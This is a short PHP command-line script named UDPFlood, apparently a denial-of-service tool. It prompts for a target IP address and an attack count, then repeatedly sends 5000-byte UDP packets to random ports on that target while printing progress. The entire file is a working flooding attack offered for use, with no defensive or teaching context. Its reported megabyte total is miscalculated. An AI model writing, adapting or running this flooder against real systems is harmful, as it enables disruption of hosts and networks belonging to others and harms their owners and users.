<?php

namespace UDPFlood {
	
	$running = true;
	$msg = str_repeat("\x00", 5000);
	$attackcount = 0;
	$error = 0;

	echo "\x1b[38;5;145mTarget IP: ";
	$ip = trim(fgets(STDIN));
	
	echo "\x1b[38;5;145mAttack count: ";
	$count = trim(fgets(STDIN));
	
	while(!is_numeric($count)){
		echo "\x1b[38;5;124mError: It's not a valid number" . PHP_EOL;
		echo "\x1b[38;5;145mAttack count: ";
		$count = trim(fgets(STDIN));
	}
	
	echo "\x1b[38;5;37mUDPFlood Started!" . PHP_EOL;
	
	while(true){
		//usleep(100000);
		$port = mt_rand(1,65000);
		
		if($attackcount >= $count){
			echo "\x1b[38;5;37mAttack successful! " . round(($attackcount * 20) / 1024, 2) . " MB packets sended." . PHP_EOL . "\x1b[m";
			$running = false;
		}
		
		if($error >= 10){
			echo "\x1b[38;5;124msome errors" . PHP_EOL . "\x1b[m";
			exit(1);
		}
		
		if(!$running){
			exit(0);
		}
		
		$fp = @fsockopen('udp://'.$ip, $port, $errno, $errstr, 30);
		if(!$fp) {
			echo "\x1b[38;5;124mUDP socket error: " . $errstr . PHP_EOL;
			$error++;
			continue;
		}
		if(!@fwrite($fp, $msg)){
			echo "\\x1b[38;5;124mData send error" . PHP_EOL;
			$error++;
		}else {
			echo "\x1b[38;5;83mData send success!" . PHP_EOL;
		}
		@fclose($fp);
		$attackcount++;
		echo "\x1b]0;UDPFlood - IP:".$ip." Port:".$port." AttackCount:".$attackcount."\x07";
	}

}
